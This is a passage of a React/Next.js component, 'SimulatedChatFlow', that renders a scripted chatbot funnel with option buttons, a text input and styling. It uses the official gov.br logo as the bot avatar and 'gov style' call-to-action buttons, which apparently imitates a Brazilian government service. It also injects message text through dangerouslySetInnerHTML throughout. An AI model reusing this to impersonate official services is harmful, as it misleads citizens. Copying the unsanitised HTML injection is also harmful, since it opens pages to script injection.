          <Image src={currentImageDetails.url} alt={currentImageDetails.alt} width={300} height={400} style={{ display:'block', maxWidth: '100%', height: 'auto', borderRadius: '4px', border: '1px solid #eee', margin: '0 auto' }} data-ai-hint={currentImageDetails.aiHint || "document image"}/>
        </div>
      )}

      {currentDisplayMessage && !isLoadingStep && (
        <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%', width: '100%'}}>
           <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
           <div className="message bot-message" style={{width: 'calc(100% - 40px)'}}>
              {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3', display: 'flex', alignItems: 'center' }}>
                {getIconComponent(currentDisplayMessage.displayIcon)}
                <span dangerouslySetInnerHTML={{ __html: currentDisplayMessage.displayTitle }} />
              </h3>}
              {currentDisplayMessage.text && <p style={{ marginBottom: currentDisplayMessage.displayDetails ? '12px' : '0', whiteSpace: 'pre-line' }} dangerouslySetInnerHTML={{__html: currentDisplayMessage.text}} />}
              {currentDisplayMessage.displayDetails && (
                <div className="details-grid" style={{ borderTop: '1px solid #e0e0e0', paddingTop: '10px', display: 'grid', gridTemplateColumns: 'auto 1fr', gap: '6px 12px', fontSize: '14px' }}>
                  {Object.entries(currentDisplayMessage.displayDetails).map(([key, value]) => (
                    <React.Fragment key={key}>
                      <span style={{ fontWeight: '500', color: '#555' }} dangerouslySetInnerHTML={{__html: key}}/>
                      <span style={{ color: '#333' }} dangerouslySetInnerHTML={{__html: value}}/>
                    </React.Fragment>
                  ))}
                </div>
              )}
               { (currentDisplayMessage.displayIcon && (funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage)?.note) && (
                <p style={{fontSize: '12px', color: '#666', marginTop: '10px', borderTop: '1px dashed #ddd', paddingTop: '8px'}}>
                    <strong>Nota:</strong> {formatText((funnelDefinition.steps[currentStepKey as keyof typeof funnelDefinition.steps]?.data as FlowStepDataDisplayMessage)?.note)}
                </p>
              )}
           </div>
        </div>
      )}

      {messages.map((msg) => (
          <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
            {msg.sender === 'bot' && (
              <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
            )}
            <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
              {msg.text && <span style={{whiteSpace: 'pre-line'}} dangerouslySetInnerHTML={{__html: msg.text}} />}
              {msg.sender === 'bot' && msg.options && !isBotTyping && !isTextInputActive && (
                <div className="options-container">
                  {msg.options.map(opt => (
                    <button
                      key={opt.text + (opt.nextStep || '') + (opt.action || '')}
                      onClick={() => handleOptionClick(opt)}
                      className={`chat-option-button ${opt.style || ''}`}
                       dangerouslySetInnerHTML={{__html: opt.text}}
                    />
                  ))}
                </div>
              )}
            </div>
          </div>
        )
      )}

      {isTextInputActive && currentTextInputConfig && !isBotTyping && (
        <form onSubmit={handleTextInputFormSubmit} className="chat-input-form-container" style={{ display: 'flex', marginTop: '10px', padding: '5px', background: '#fff', borderRadius: '8px', boxShadow: '0 2px 10px rgba(0,0,0,0.1)' }}>
          <input
            type="text"
            value={textInputValue}
            onChange={(e) => setTextInputValue(e.target.value)}
            placeholder={formatText(currentTextInputConfig.placeholder)}
            className="chat-text-input"
            style={{ flexGrow: 1, border: '1px solid #ccc', borderRadius: '15px', padding: '10px 15px', marginRight: '8px', fontSize: '15px' }}
            autoFocus
          />
          <button type="submit" className="chat-send-button" style={{ background: '#1451b4', color: 'white', border: 'none', borderRadius: '50%', width: '40px', height: '40px', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer' }}>
            <Send size={20} />
          </button>
        </form>
      )}

      {isBotTyping && !isLoadingStep && !videoPlaceholderData.current && !currentDisplayMessage && !currentImageDetails && !isTextInputActive && (
         <div className="message-container bot-message-container">
            <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} data-ai-hint="government logo"/>
            <div className="message bot-message typing-indicator">
                <span className="dot"></span><span className="dot"></span><span className="dot"></span>
            </div>
        </div>
      )}
      <div ref={chatEndRef} />
      <style jsx>{`
        .message-container { display: flex; margin-bottom: 12px; max-width: 90%; }
        .bot-message-container { align-self: flex-start; }
        .user-message-container { align-self: flex-end; flex-direction: row-reverse; }
        .bot-avatar { width: 32px; height: 32px; border-radius: 50%; margin-right: 8px; margin-top: 4px; align-self: flex-start; object-fit: cover; }
        .message { padding: 10px 15px; border-radius: 18px; line-height: 1.4; font-size: 15px; word-wrap: break-word; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .bot-message { background-color: #e9ecef; color: #333; border-bottom-left-radius: 4px; }
        .user-message { background-color: #007bff; color: white; border-bottom-right-radius: 4px; }
        .user-message-container .user-message { margin-left: auto; }

        .options-container {
          margin-top: 10px;
          display: flex;
          flex-wrap: wrap;
          align-items: flex-start;
          justify-content: flex-start; /* Align options to the left for bot messages */
          gap: 8px;
        }
        .chat-option-button {
          background-color: #007bff;  /* Blue background for options */
          color: white;
          border: none;
          padding: 10px 20px;
          border-radius: 25px; /* Pill shape */
          cursor: pointer;
          font-size: 15px;
          font-weight: 500;
          transition: background-color 0.2s;
          text-align: center;
          box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .chat-option-button:hover { background-color: #0056b3; }

        /* Gov style variants for specific buttons if needed */
        .chat-option-button.primary_cta_button_gov_style { background-color: #16a34a; border-color: #16a34a; color: white; font-weight: bold;}
        .chat-option-button.primary_cta_button_gov_style:hover { background-color: #15803d; border-color: #15803d; color: white; }

        .chat-option-button.secondary_link_button_gov_style { background-color: transparent; border: none; color: #007bff; text-decoration: underline; padding: 4px 0; box-shadow: none; font-size: 14px;}
        .chat-option-button.secondary_link_button_gov_style:hover { color: #0056b3; background-color: transparent; }

        .chat-option-button.destructive_link_button_gov_style { background-color: transparent; border: none; color: #dc3545; text-decoration: underline; padding: 4px 0; box-shadow: none; font-size: 14px;}
        .chat-option-button.destructive_link_button_gov_style:hover { color: #c82333; background-color: transparent; }

        .typing-indicator { display: inline-flex; align-items: center; padding: 10px 15px; }
        .typing-indicator .dot { width: 8px; height: 8px; margin: 0 2px; background-color: #aaa; border-radius: 50%; animation: bounce 1.4s infinite; }
        .typing-indicator .dot:nth-child(2) { animation-delay: 0.2s; }
        .typing-indicator .dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes bounce { 0%, 80%, 100% { transform: scale(0); } 40% { transform: scale(1); } }
        .display-message-block .bot-message { width: auto; max-width: 100%; }
      `}</style>
    </div>
  );
};

export default SimulatedChatFlow;

// Helper interfaces for more specific step data, useful if expanding type safety
interface FlowStepVideo extends FlowStep { type: 'videoDisplay'; data: FlowStepDataVideo; nextAction: 'play_video_then_proceed'; }
interface FlowStepMultipleChoice extends FlowStep { type: 'multipleChoice'; data: FlowStepDataMultipleChoice; }
// ... and so on for other types if needed for stricter type checking in switch cases.
